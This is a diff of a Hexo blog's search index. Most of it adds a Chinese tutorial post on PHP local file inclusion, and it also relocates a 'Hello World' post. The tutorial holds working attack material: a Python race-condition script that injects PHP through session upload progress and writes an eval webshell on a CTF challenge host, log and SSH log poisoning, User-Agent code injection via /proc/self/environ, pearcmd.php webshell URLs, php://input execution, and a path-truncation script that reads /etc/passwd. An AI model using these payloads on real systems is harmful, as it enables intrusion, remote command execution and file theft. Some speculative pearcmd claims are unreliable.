+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session.upload_progress.enable = on</span><br><span class="line">session.upload_progress.cleanup = on</span><br><span class="line">session.upload_progress.prefix = &quot;upload_progress_&quot;</span><br><span class="line">session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>enable = on</code>表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</li>
+<li><code>cleanup = on</code>表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；<strong>cleanup选项决定了我们需要条件竞争</strong></li>
+<li><code>name</code>当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</li>
+<li><code>prefix+name</code>将表示为session中的键名;</li>
+</ul>
+<p><code>session.auto_start</code>：默认为off，若为on，php会在接收请求的时候会自动初始化Session，不再需要执行<code>session_start()</code></p>
+<p><code>session.use_strict_mode</code>：默认值为0，此时用户可以自定义Sesssion ID（默认情况下，PHP允许<strong>任何客户端使用 <code>PHPSESSID</code> 发送请求并恢复会话，</strong>如果攻击者提前猜测或设置了<code>PHPSESSID</code>，则可能劫持用户的会话），比如，我们在Cookie里设置<code>PHPSESSID=ROIS</code>，PHP将会在服务器上创建一个文件<code>/tmp/sess_ROIS</code>。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有<code>ini.get(“session.upload_progress.prefix”)</code>+由我们构造的<code>session.upload_progress.name</code>值组成，最后被写入sess_文件里</p>
+<p>注：由于<code>cleanup=on</code>，会导致文件上传后，session文件的内容立即清空。此时我们得利用条件竞争，在session文件的内容被清空前进行文件包含</p>
+<h5 id="常见的php-session存放位置"><a href="#常见的php-session存放位置" class="headerlink" title="常见的php-session存放位置"></a>常见的php-session存放位置</h5><ul>
+<li><code>/var/lib/php/sess_PHPSESSID</code></li>
+<li><code>/var/lib/php/sessions/sess_PHPSESSID</code></li>
+<li><code>/tmp/sess_PHPSESSID</code></li>
+<li><code>/tmp/sessions/sess_PHPSESSID</code></li>
+</ul>
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>python脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import io</span><br><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">sessid = &#x27;Qftm&#x27;</span><br><span class="line"></span><br><span class="line">def POST(session):</span><br><span class="line">    while True:</span><br><span class="line">        f = io.BytesIO(b&#x27;a&#x27; * 1024 * 50)</span><br><span class="line">        session.post(</span><br><span class="line">            &#x27;http://250307c3-cf87-4811-987f-20189fa2442c.chall.ctf.show/&#x27;,</span><br><span class="line">            data=&#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&quot;&lt;?php system(&#x27;cat *&#x27;);fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[mtfQ])?&gt;&#x27;);?&gt;&quot;&#125;,</span><br><span class="line">            files=&#123;&quot;file&quot;:(&#x27;q.txt&#x27;, f)&#125;,</span><br><span class="line">            cookies=&#123;&#x27;PHPSESSID&#x27;:sessid&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">def READ(session):</span><br><span class="line">    while True:</span><br><span class="line">        response = session.get(f&#x27;http://250307c3-cf87-4811-987f-20189fa2442c.chall.ctf.show/?file=/tmp/sess_&#123;sessid&#125;&#x27;)</span><br><span class="line">        if &#x27;flag&#x27; not in response.text:</span><br><span class="line">            print(&#x27;[+++]retry&#x27;)</span><br><span class="line">        else:</span><br><span class="line">            print(response.text)</span><br><span class="line">            sys.exit(0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">with requests.session() as session:</span><br><span class="line">    t1 = threading.Thread(target=POST, args=(session, ))</span><br><span class="line">    t1.daemon = True</span><br><span class="line">    t1.start()</span><br><span class="line"></span><br><span class="line">    READ(session)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="包含日志"><a href="#包含日志" class="headerlink" title="包含日志"></a>包含日志</h3><h4 id="访问日志"><a href="#访问日志" class="headerlink" title="访问日志"></a>访问日志</h4><h5 id="利用条件-3"><a href="#利用条件-3" class="headerlink" title="利用条件"></a>利用条件</h5><p>需要知道服务器日志的存储路径，且日志文件可读</p>
+<h5 id="日志位置"><a href="#日志位置" class="headerlink" title="日志位置"></a>日志位置</h5><p>nginx：<code>/var/log/nginx/access.log</code></p>
+<p>apache：<code>/var/log/apache2/access_log(access.log)</code></p>
+<p>注：在CTF中，log的地址常被修改掉，可以通过读取相应的配置文件后，再进行包含</p>
+<h5 id="payload插入"><a href="#payload插入" class="headerlink" title="payload插入"></a>payload插入</h5><p>位置：User-Agent头，GET参数</p>
+<p>User-Agent头不需要抓包解码，GET参数需要。</p>
+<p>最后getshell即可</p>
+<h4 id="SSH-log"><a href="#SSH-log" class="headerlink" title="SSH log"></a>SSH log</h4><p>SSH（Secure Shell）是一种加密协议，主要用于远程安全登录和服务器管理</p>
+<h5 id="利用条件-4"><a href="#利用条件-4" class="headerlink" title="利用条件"></a>利用条件</h5><p>需要知道ssh-log的位置，且可读。默认情况下为<code>/var/log/auth.log</code></p>
+<p>ubuntu中：<code>ssh &#39;&lt;?php phpinfo(); ?&gt;&#39;@remotehost</code></p>
+<p>之后会提示输入密码等等，随便输入。<br>然后在remotehost的ssh-log中即可写入php代码</p>
+<h3 id="包含environ（环境变量）"><a href="#包含environ（环境变量）" class="headerlink" title="包含environ（环境变量）"></a>包含environ（环境变量）</h3><h4 id="利用条件-5"><a href="#利用条件-5" class="headerlink" title="利用条件"></a>利用条件</h4><ul>
+<li>php以cgi方式运行，这样environ才会保持UA头。</li>
+<li>environ文件存储位置已知，且environ文件可读。</li>
+</ul>
+<h4 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h4><p>如果一个 Web 服务器有 LFI（本地文件包含）漏洞，但 <code>php://filter</code>、<code>log poisoning</code> 都不可用，那么 <code>/proc/self/environ</code> 可能是最后的希望</p>
+<p>如果目标服务器运行 PHP，并且 <code>$_SERVER[&#39;HTTP_USER_AGENT&#39;]</code> 被写入环境变量，可以尝试在 <code>User-Agent</code> 头中注入恶意代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /?file=/proc/self/environ HTTP/1.1</span><br><span class="line">Host: target.com</span><br><span class="line">User-Agent: &lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后访问<code>http://target.com/?file=/proc/self/environ&amp;cmd=whoami</code></p>
+<h3 id="包含fd"><a href="#包含fd" class="headerlink" title="包含fd"></a>包含fd</h3><p>跟包含environ类似</p>
+<h3 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h3><p>同样要竞争</p>
+<h3 id="包含上传文件"><a href="#包含上传文件" class="headerlink" title="包含上传文件"></a>包含上传文件</h3><p>配合文件上传漏洞，基本原理不变</p>
+<h3 id="包含pearcmd"><a href="#包含pearcmd" class="headerlink" title="包含pearcmd"></a>包含pearcmd</h3><p><code>pearcmd.php</code> 是 <strong>PHP PEAR（PHP Extension and Application Repository）</strong> 的命令行管理工具，如果服务器存在 <strong>本地文件包含（LFI）漏洞</strong>，可以通过包含 <code>pearcmd.php</code> 并传参来执行任意 PHP 代码，从而实现 <strong>远程命令执行（RCE）</strong></p>
+<h4 id="pearcmd-php-可能的路径"><a href="#pearcmd-php-可能的路径" class="headerlink" title="pearcmd.php 可能的路径"></a><code>pearcmd.php</code> 可能的路径</h4><h5 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/share/php/pearcmd.php</span><br><span class="line">/usr/local/lib/php/pearcmd.php</span><br><span class="line">/var/www/html/pear/pearcmd.php</span><br></pre></td></tr></table></figure>
+
+<h5 id="Windows（XAMPP）"><a href="#Windows（XAMPP）" class="headerlink" title="Windows（XAMPP）"></a>Windows（XAMPP）</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\xampp\php\PEAR\pearcmd.php</span><br></pre></td></tr></table></figure>
+
+<h4 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h4><h6 id="直接包含-pearcmd-php-进行-RCE"><a href="#直接包含-pearcmd-php-进行-RCE" class="headerlink" title="直接包含 pearcmd.php 进行 RCE"></a>直接包含 <code>pearcmd.php</code> 进行 RCE</h6><p>如果服务器有 LFI 漏洞，可以直接访问：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://target.com/index.php?file=/usr/share/php/pearcmd.php</span><br></pre></td></tr></table></figure>
+
+<p>然后使用 <code>+config-create+</code> 写入 Webshell：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://target.com/index.php?file=/usr/share/php/pearcmd.php&amp;+config-create+/var/www/html+&lt;?=system($_GET[&#x27;cmd&#x27;]);?&gt;+.php</span><br></pre></td></tr></table></figure>
+
+<p><strong>这将在 <code>/var/www/html/.php</code> 生成 Webshell</strong>，然后访问：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://target.com/.php?cmd=id</span><br></pre></td></tr></table></figure>
+
+<p>即可执行系统命令</p>
+<h6 id="结合-php-input-进行代码执行"><a href="#结合-php-input-进行代码执行" class="headerlink" title="结合 php://input 进行代码执行"></a>结合 <code>php://input</code> 进行代码执行</h6><p>如果服务器 <code>allow_url_include=On</code>，可以：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://target.com/index.php?file=php://input</span><br></pre></td></tr></table></figure>
+
+<p>然后用 <code>POST</code> 发送：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&#x27;id&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如果 <code>pearcmd.php</code> 存在，也可以利用：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://target.com/index.php?file=/usr/share/php/pearcmd.php&amp;+config-show</span><br></pre></td></tr></table></figure>
+
+<p>这样 <code>pearcmd.php</code> 可能会解析 <strong>session</strong> 或 <strong>临时文件</strong>，执行恶意代码</p>
+<h6 id="结合-session-auto-start-进行代码执行"><a href="#结合-session-auto-start-进行代码执行" class="headerlink" title="结合 session.auto_start 进行代码执行"></a>结合 <code>session.auto_start</code> 进行代码执行</h6><p>如果 <code>session.auto_start=1</code>，可以将恶意代码写入 <code>$_SESSION</code>，然后通过 <code>pearcmd.php</code> 解析：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;payload&#x27;] = &quot;&lt;?php system(&#x27;id&#x27;); ?&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后访问：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://target.com/index.php?file=/usr/share/php/pearcmd.php&amp;+config-show</span><br></pre></td></tr></table></figure>
+
+<p>可能会解析 <code>$_SESSION</code> 并执行 <code>payload</code> 代码</p>
+<h2 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h2><h3 id="指定前缀"><a href="#指定前缀" class="headerlink" title="指定前缀"></a>指定前缀</h3><h4 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h4><p><code>../</code>可以进行目录遍历</p>
+<h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>有时把点号过滤了，尝试编码点号</p>
+<h3 id="指定后缀"><a href="#指定后缀" class="headerlink" title="指定后缀"></a>指定后缀</h3><h4 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h4><p>URL格式在此处具有妙用，可以在payload最后加**<code>?</code>或者<code>#（url编码为%23）</code>，或者空格绕过%20**</p>
+<h4 id="使用协议"><a href="#使用协议" class="headerlink" title="使用协议"></a>使用协议</h4><p>phar:&#x2F;&#x2F;和zip:&#x2F;&#x2F;都可以</p>
+<h4 id="长度截断"><a href="#长度截断" class="headerlink" title="长度截断"></a>长度截断</h4><p>利用条件： php版本 &lt; php 5.2.8</p>
+<p>目录字符串，在linux下4096字节时会达到最大值，在window下是256字节。只要不断的重复<code>./</code></p>
+<p>则后缀<code>/test/test.php</code>，在达到最大值后会被直接丢弃掉</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"># 目标 URL</span><br><span class="line">url = &quot;http://target.com/index.php?file=&quot;</span><br><span class="line"></span><br><span class="line"># 目标文件</span><br><span class="line">payload = &quot;../../../../../../etc/passwd&quot;</span><br><span class="line"></span><br><span class="line"># 生成超长路径（超过服务器限制）</span><br><span class="line">long_truncation = payload + &quot;A&quot; * 4000  # 让路径超长</span><br><span class="line"></span><br><span class="line"># 发送请求</span><br><span class="line">response = requests.get(url + long_truncation)</span><br><span class="line"></span><br><span class="line"># 检查是否成功</span><br><span class="line">if &quot;root:&quot; in response.text:</span><br><span class="line">    print(&quot;[+] 成功绕过，已读取 /etc/passwd&quot;)</span><br><span class="line">    print(response.text)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;[-] 失败，可能需要调整长度&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><code>/etc/passwd</code> 文件包含 <code>root:</code> 关键字，如果返回 <code>root:x:0:0:</code> 说明读取成功</p>
+<h4 id="0字节截断"><a href="#0字节截断" class="headerlink" title="0字节截断"></a>0字节截断</h4><p>利用条件： php版本 &lt; php 5.3.4</p>
+<p><code>index.php?file=phpinfo.txt%00</code></p>
+<h3 id="指定前后缀"><a href="#指定前后缀" class="headerlink" title="指定前后缀"></a>指定前后缀</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    include &#x27;/var/www/html/&#x27;.$file.&#x27;/test/test.php&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以使用目录遍历和长度截断（或者0字节截断），有必要的话可以对点号编码，至少协议和URL使用不了</p>
+<h2 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h2><ul>
+<li>在很多场景中都需要去包含web目录之外的文件，如果php配置了<code>open_basedir</code>，则会包含失败</li>
+</ul>
+<p><code>open_basedir</code> 的主要作用是限制 PHP 脚本只能访问指定的目录及其子目录。这样，即使某个脚本存在漏洞，也无法访问超出这些限定目录之外的文件</p>
+<ul>
+<li>做好文件的权限管理</li>
+<li>对危险字符进行过滤等等</li>
+</ul>
+</div>]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>PHP</tag>
+        <tag>漏洞</tag>
+        <tag>文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>PHP特性</title>
     <url>/2025/02/19/PHP%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/</url>
     <content><![CDATA[<div id="postchat_postcontent"><h1 id="PHP特性总结"><a href="#PHP特性总结" class="headerlink" title="PHP特性总结"></a>PHP特性总结</h1><h2 id="数组绕过正则表达式"><a href="#数组绕过正则表达式" class="headerlink" title="数组绕过正则表达式"></a>数组绕过正则表达式</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(preg_match(&quot;/[0-9]/&quot;, $num))&#123;</span><br><span class="line">	die(&quot;no no no!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else(intval($num))&#123;</span><br><span class="line">	echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -2841,6 +2841,24 @@
       <tags>
         <tag>PHP</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2024/10/10/hello-world/</url>
+    <content><![CDATA[<div id="postchat_postcontent"><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+</div>]]></content>
   </entry>
   <entry>
     <title>SQL注入</title>
@@ -3380,24 +3398,6 @@
         <tag>漏洞</tag>
         <tag>XSS</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/2024/10/10/hello-world/</url>
-    <content><![CDATA[<div id="postchat_postcontent"><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-</div>]]></content>
   </entry>
   <entry>
     <title>kali优化</title>
